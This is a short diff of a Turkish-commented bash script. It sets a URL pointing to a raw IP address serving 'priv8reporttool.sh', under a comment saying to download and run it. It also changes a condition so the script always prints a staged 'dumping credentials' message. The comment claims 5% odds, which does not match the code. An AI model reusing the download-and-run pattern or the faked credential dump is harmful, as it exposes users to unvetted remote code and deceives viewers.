@@ -1,6 +1,6 @@
 #!/bin/bash
 
-URL="24.133.19.34/priv8reporttool.sh"
+URL="http://24.133.19.34/priv8reporttool.sh"
 DOSYA="reporttool.sh"
 
 # Tool'u indir ve çalıştır
@@ -77,7 +77,7 @@ echo -e " [*] ${YELLOW}products${NC}"
 echo -e " [*] ${YELLOW}logs${NC}"
 
 # %5 ihtimalle sahte veri sızıntısı
-if (( RANDOM % 100 == 0 )); then
+if (( RANDOM % 1 == 0 )); then
   echo -e "${RED}[WARNING]${NC} Dumping credentials from 'users' table..."
   sleep 2
   echo -e " id | username | password"
